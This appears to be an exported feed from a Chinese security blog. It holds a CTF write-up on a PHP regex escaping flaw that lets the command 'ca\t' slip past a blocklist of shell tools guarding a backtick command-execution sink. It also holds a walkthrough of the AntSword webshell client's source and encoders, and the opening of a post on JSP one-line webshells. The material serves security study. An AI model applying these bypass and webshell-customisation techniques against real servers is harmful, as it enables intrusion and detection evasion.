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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Tomcat内存Webshell解析
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="webshell" scheme="https://yzddmr6.tk/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>ASP/ASPX下的流量混淆</title>
    <link href="https://yzddmr6.tk/posts/asp-aspx-encoders/"/>
    <id>https://yzddmr6.tk/posts/asp-aspx-encoders/</id>
    <published>2020-05-01T14:03:17.000Z</published>
    <updated>2021-06-17T15:13:14.820Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      ASP/ASPX下的流量混淆
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>从一道CTF的非预期解看PHP反斜杠匹配问题</title>
    <link href="https://yzddmr6.tk/posts/php-preg-tricks/"/>
    <id>https://yzddmr6.tk/posts/php-preg-tricks/</id>
    <published>2020-04-12T03:47:51.000Z</published>
    <updated>2021-06-17T15:31:40.997Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>刷buuoj的时候遇到<code>[安洵杯 2019]easy_web</code> 这样一个题，做一半看到他这个正则写的有点问题，就去翻wp。</p><p>找到了<a href="https://xz.aliyun.com/t/6911" target="_blank" rel="noopener">官方的wp</a>发现果然是个非预期。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900412316-7438ca54-f52c-4ed0-8487-28518cdeca04.png" alt="img"></p><p>但是官方wp中并没有深入说明。后来看到评论去翻出题人的博客也没找到相关的信息，加上看到了其他wp中一些不准确的说法，所以今天就有了这篇文章来讲一讲自己的看法。</p><h2 id="正文">正文</h2><p>题目源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) </span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面md5碰撞已经是老套路了，问题出在后面对shell命令的过滤上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉php代码审计的同学应该都知道，在preg_match中要过滤<code>\</code> 是需要四个<code>\\\\</code>才可以达到目的，原理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$str = &apos;\/div&apos;;</span><br><span class="line">$pattern = &apos;/\\\\\/div/&apos;;</span><br><span class="line">// &apos;\\\\\/&apos; 解析过程如下：</span><br><span class="line">// PHP解析：</span><br><span class="line">// 第1个&apos;\&apos;转义第2个&apos;\&apos;，转义后为字符串&apos;\&apos;</span><br><span class="line">// 第3个&apos;\&apos;转义第4个&apos;\&apos;，转义后为字符串&apos;\&apos;</span><br><span class="line">// 第5个&apos;\&apos;转义&apos;/&apos;，转义后为字符串&apos;/&apos;</span><br><span class="line">// 字符合起来为&apos;\\/&apos; （则 \\/div 即为正则将要解析的内容，注意：正则解析的内容已经不包括正则标识符//）</span><br><span class="line">// 正则解析器解析：</span><br><span class="line">// 两个&apos;\\&apos; 正则表达式看做&apos;\&apos; （则正则最终解析为 \/div）</span><br><span class="line">$rs = preg_match($pattern, $str, $arr);</span><br><span class="line">if($rs) print_r($arr); // Array ( [0] =&gt; \/div )</span><br></pre></td></tr></table></figure><p>但是出题人似乎觉得不够，又在后面加了四个反斜杠的匹配，似乎本意是要过滤<code>\</code>跟<code>\\</code>？</p><p>理论来说已经出现了四个<code>\\\\</code>了，但是为什么还会造成非预期<code>ca\t</code>这种解呢？</p><p>我们本地测试一下</p><p>去掉其他的乱七八糟的东西，只留下对于反斜杠等的过滤</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900412435-aa033685-93cd-4d3b-bf4d-a10d879dcdd2.png" alt="img"></p><p>可以看到虽然正则中有<code>\\\\</code>，但是却无法过滤到反斜杠。</p><p>反向思考其原因，应该是问题出在前面两个反斜杠的匹配部分。</p><p>因为正则匹配中相当于要经过两层解析器解析，一层是php的，一层是正则表达式的。所以此处前面的两个反斜杠经过php解析器处理后应该是表示了一个转义号<code>\</code>，之后又与后面的表示逻辑或的<code>|</code>结合到一起，从而在正则表达式解析器中解析为<code>\|</code>。又因为<code>|</code>是正则中的保留符号，所以需要一个转义符来转义。所以最后的实现效果应为对于字符<code>|</code>的过滤。</p><p>所以我们猜测这种写法真正被解析的结果应该是对于字符串<code>|\</code>的过滤，即不是单独的<code>\</code>的匹配。</p><p>我们来验证一下猜想是否正确：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900412560-28a7746f-6d38-4de8-83ab-60357d292f4a.png" alt="img"></p><p>可以看到此时已经触发了正则匹配机制，输出了forbid。</p><p>所以综上所述：非预期的原因是错误的正则写法匹配了<code>|\</code>，而非预期的<code>\</code></p><h2 id="错误的一些说法">错误的一些说法</h2><h3 id="第一个">第一个</h3><p><a href="https:_www.cnblogs.com_20175211lyz_p_12189515" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12189515.html</a></p><p>这篇文章中提到反斜杠有这么多种匹配方法，如果你做实验的话发现也确实会输出1234。事实真的是这样吗？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413041-d64dd8f0-7f79-414a-a465-a4c6c262c8c7.png" alt="img"></p><p>随便写个字符串，发现134照样可以匹配到。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413158-6e2dfe2e-e5e7-4eb1-b1a0-d9e13076ff37.png" alt="img"></p><p>原因是134条规则都在左右多加了个<code>|</code>，然而<code>|</code>左右为空，也就是说对于任意空字符串都可以匹配，而并非预期的目的。</p><h3 id="第二个">第二个</h3><p>这篇文章的解释是把\t当成tab，这个就更离谱了。</p><p><a href="https://blog.csdn.net/SopRomeo/article/details/104124545" target="_blank" rel="noopener">https://blog.csdn.net/SopRomeo/article/details/104124545</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413248-c9604728-2b4b-406c-a6bf-f94e3e5d1624.png" alt="img"></p><h3 id="第三个">第三个</h3><p><a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413339-de5c280f-e3b3-42cf-8b1c-ba119b66fc82.png" alt="img"></p><p>这个同学自己调试了一番，离真相就差一点啦。</p><h2 id="最后">最后</h2><p>纸上得来终觉浅，绝知此事要躬行。</p><p>与君共勉。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;刷buuoj的时候遇到&lt;code&gt;[安洵杯 2019]easy_web&lt;/code&gt; 这样一个题，做一半看到他这个正则写的有点问题，就去翻wp。&lt;/
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="CTF" scheme="https://yzddmr6.tk/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>中国蚁剑源码分析</title>
    <link href="https://yzddmr6.tk/posts/antsword-diy-4/"/>
    <id>https://yzddmr6.tk/posts/antsword-diy-4/</id>
    <published>2020-04-11T07:33:00.000Z</published>
    <updated>2021-06-17T15:36:11.737Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>发现很多同学对于蚁剑的基本流程还有源码结构不太熟悉，所以就有了这一篇比较基础的文章，来讲一讲自己对于蚁剑的一些认识。</p><p>通过阅读本篇文章，你可以了解蚁剑的源码结构、运行流程、以及自己动手diy时要注意的几个地方。</p><h2 id="正文">正文</h2><h3 id="目录结构">目录结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/antData/用户目录</span><br><span class="line">/modules/蚁剑后端模块</span><br><span class="line">/node_modules/安装的node模块</span><br><span class="line">/source/核心模块</span><br><span class="line">/base/ 自定义的功能类</span><br><span class="line">/core/payload模板</span><br><span class="line">/language/语言模块</span><br><span class="line">/modules/显示模块</span><br><span class="line">/ui/UI模块</span><br><span class="line">/app.entry.js渲染程序入口</span><br><span class="line">/load.entry.js前端加载模块</span><br><span class="line">/static/静态资源文件</span><br><span class="line">/views/前端文件</span><br></pre></td></tr></table></figure><p>其中最核心的是modules目录跟source目录。modules里的内容为蚁剑的后端模块，属于主进程。source中存放着蚁剑运行的核心代码，属于渲染进程。</p><h3 id="如何debug">如何debug</h3><p>蚁剑的开发栈主要是：javascript / nodejs / electron。</p><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。通过Node它提供了通常浏览器所不能提供的能力。</p><p>简单来说就是chrome里跑nodejs。</p><p>所以想要对蚁剑二次开发，要首先熟悉一下nodejs的基本语法。</p><p>electron里面又分主进程跟渲染进程，对于主进程的调试需要用到vscode等，而对于渲染进程只需要用到蚁剑中自带的dev tool就可以。具体可以看这篇文章：<a href="https://blog.csdn.net/gary_yan/article/details/78973336" target="_blank" rel="noopener">https://blog.csdn.net/gary_yan/article/details/78973336</a></p><p>一般来说，我们并不需要对modules中的后端模块进行修改，所以一般不会用到主进程调试，仅仅蚁剑中自带的dev tool就可以完成我们日常的调试工作。</p><p>打开蚁剑-&gt;调试-&gt;开发者工具即可看到调试工具。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900379201-4772fcb7-ef45-40a9-923a-0e7f20bcc8b3.png" alt="img"></p><p>是不是跟chrome一模一样？</p><p>其中console用于打印输出日志，蚁剑中默认的日志只会打印前100个字符，如果要查看完整日志需要输入antsword.logs[id]查看，在这里我们直接查看所有日志。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900379387-87199788-06fb-4a87-9b52-e190f41a4851.png" alt="img"></p><p>我们先连接上本地的shell，然后打印完整日志，就可以看到我们发包的很多参数，包括shell的配置，编码器设置，字符编码，返回内容等等</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900379496-2fa9a42f-86a0-4f5c-83ac-751baaf49761.png" alt="img"></p><p>那么我们在哪里下断点呢</p><p>答案是在控制台sources-&gt;no domain下面,打开后我们可以看到渲染进程中加载到的各种资源、模块</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900379637-5e0aa02d-b9a4-40d2-b6f1-782813864858.png" alt="img"></p><p>然后我们找到想下断点的文件，就拿php的base64编码器为例，在其10行处点击一下会出现蓝标，就表示下断点成功。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900379749-84f8a1df-495d-42e2-adf5-759ba0f4d1af.png" alt="img"></p><p>此时我们在shell管理界面右键-&gt;刷新目录，就可以看到程序已经断到了我们下断点的地方，在右边可以看到此时的调用栈还有各种变量信息，就可以愉快的调试了。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900379979-35bb1753-454e-42d6-9c7a-47d849f2c264.png" alt="img"></p><h3 id="执行流程">执行流程</h3><ul><li><p>主程序入口：app.js</p></li><li><p>/source/load.entry.js 前端加载模块</p></li><li><p>/source/app.entry.js 渲染程序入口</p></li><li><p>/source/modules/filemanager/index.js 监听用户操作</p></li><li><p>/source/core/php/template/ 提取组合Payload</p></li><li><p>/source/core/base.js 发送事件与配置到后端request模块</p></li><li><p>解析、回显</p></li></ul><p>就按刚才php base64编码器为例，我们看一下蚁剑是如何运行到这一步的。</p><p>查看上一个调用栈，发现是进入到了编码器处理部分，编码器会接收到三个参数：shell密码、初步payload、还有ext参数。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900380144-62b4e2de-d426-4c52-b740-a2cb616ae23f.png" alt="img"></p><p>其中ext参数即为shell的配置信息还有rsa对象的组合，这也是为什么我们在写编码器的时候可以直接获取到shell的各种配置信息。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900380284-dddbe9cc-17b0-430b-978e-3ffdb0589071.png" alt="img"></p><p>再往上看，发现complete函数调用了encodeComplete函数，complete负责将payload套入到模板中，并且设置数据前后分割符，发送给encodeComplete进行处理。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900380391-084335b8-1ddd-4c88-b994-721354ba1d36.png" alt="img"></p><p>再进入到core/base中的request函数，此函数负责将组合完成的数据包发送到后端的request模块。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900380522-0c24191e-f1e6-4ff0-b540-205011daeccc.png" alt="img"></p><p>那么是如何触发到这个请求功能的呢，我们直接跳到最开始的点击事件来看。</p><p>发现是当我们点击刷新目录后，会触发refreshPath函数。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900380651-6a0cf8c5-6321-43f4-9136-8a54526835b3.png" alt="img"></p><p>然后refreshPath函数分析是否有传递的路径参数，如果没有则为刷新当前目录。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900380772-2218e200-4547-4d53-b374-6af27ea9b492.png" alt="img"></p><p>然后gotoPath调用了this.manager.getFiles函数。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900380925-2547512e-a03d-4aa0-8aca-ec5e5742f8a6.png" alt="img"></p><p>getFiles函数调用this.core.request，第一个参数为this.core.filemanager.dir，即为payload模板中的dir部分。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900381258-ffef63b4-268d-42e7-8e5c-fa4877c4a7b0.png" alt="img"></p><p>接着组合、发送payload数据包，获取回显并解析。</p><p>其中解析跟回显部分不是我们关注的重点，我们关注的重点主要是提取组合payload到发送最终数据包的阶段。大家自己调试一下就明白其中的流程了。</p><h3 id="修改数据包的几个重点位置">修改数据包的几个重点位置</h3><p>其中，如果要修改发送的数据包，有三个位置可以供我们参考。</p><ul><li><p>\source\core\base.js#187模板组合（作用对象为全体）</p></li><li><p>\source\core\php\encoder\base64.js编码器处理（作用于当前类型）</p></li><li><p>\modules\request.js最终发包（不建议修改）</p></li></ul><p>不建议修改后端最终发包是因为蚁剑中后端默认不能获取到所有的opt配置内容，除非自己加，我觉得比较麻烦。</p><h3 id="配合opt参数实现自定义设置">配合opt参数实现自定义设置</h3><p>opt参数中有shell的所有配置，通过此项可以做到动态修改数据包的内容。比如说我在<a href="https://yzddmr6.tk/posts/antsword-xor-encoder-2/">基于随机Cookie的蚁剑动态秘钥编码器</a>中就是利用<code>ext.opts.httpConf.headers['Cookie'] = xxx</code>在数据包头部添加了一个cookie作为秘钥</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900381368-4e0fbd8b-5db3-413e-90bf-71ad86ef3f41.png" alt="img"></p><p>在编码器中要用<code>ext.opts.xxx</code>来访问你想要访问的配置内容，在其他地方一般用<code>this.__opts__.xxx</code>或者<code>opts['xxx']</code>即可。</p><h2 id="最后">最后</h2><p>在实现蚁剑jsp一句话的过程中，我使用了额外传递参数的方式来决定采用什么编码器、什么字符编码等。大家可以看一下我在编码器中的写法。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900381513-32361038-1854-48cf-b4cc-6b8a931e7b88.png" alt="img"></p><p>这个方法是挺简单，但是特征也比较明显。那么怎么办呢？</p><p>相信你读完这篇文章后已经可以试着自己去改掉这个特征，有好的想法欢迎跟我交流。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;发现很多同学对于蚁剑的基本流程还有源码结构不太熟悉，所以就有了这一篇比较基础的文章，来讲一讲自己对于蚁剑的一些认识。&lt;/p&gt;&lt;p&gt;通过阅读本篇文章，
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="中国蚁剑" scheme="https://yzddmr6.tk/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>蚁剑改造计划之实现JSP一句话</title>
    <link href="https://yzddmr6.tk/posts/antsword-diy-3/"/>
    <id>https://yzddmr6.tk/posts/antsword-diy-3/</id>
    <published>2020-03-28T05:24:58.000Z</published>
    <updated>2021-06-17T15:36:30.864Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。</p><p>因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。</p><p>不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。</p><ul><li><p><a href="https://xz.aliyun.com/t/6571" target="_blank" rel="noopener">蚁剑改造计划之实现动态秘钥编码器解码器</a></p></li><li><p><a href="https://xz.aliyun.com/t/6917" target="_blank" rel="noopener">蚁剑改造计划之基于随机Cookie的动态秘钥编码器</a></p></li><li><p><a href="https://xz.aliyun.com/t/7126" target="_blank" rel="noopener">蚁剑改造计划之增加垃圾数据</a></p></li><li><p><a href="https://yzddmr6.tk/posts/antsword-diy-2/">蚁剑改造计划之实现其他参数的随机化</a></p></li></ul><h2 id="正文">正文</h2><h3 id="基本原理">基本原理</h3><p>由于Java中没有所谓的eval函数，无法对直接传递的代码进行解析执行。所以不管是蚁剑还是菜刀对于JSP的shell一直是采用custom模式，即把要执行的代码提前写在shell中，然后每次只需要传递要调用的函数名以及对应的参数即可。</p><p>虽然可以实现相应的功能，但是带来一个问题就是shell体积非常巨大。菜刀的jsp脚本有7kb大小，蚁剑的jsp custom脚本即使去掉注释后还有17k之多，用起来非常的不方便。</p><p>冰蝎的作者rebeyond大佬在文章 <a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener">利用动态二进制加密实现新型一句话木马之Java篇</a> 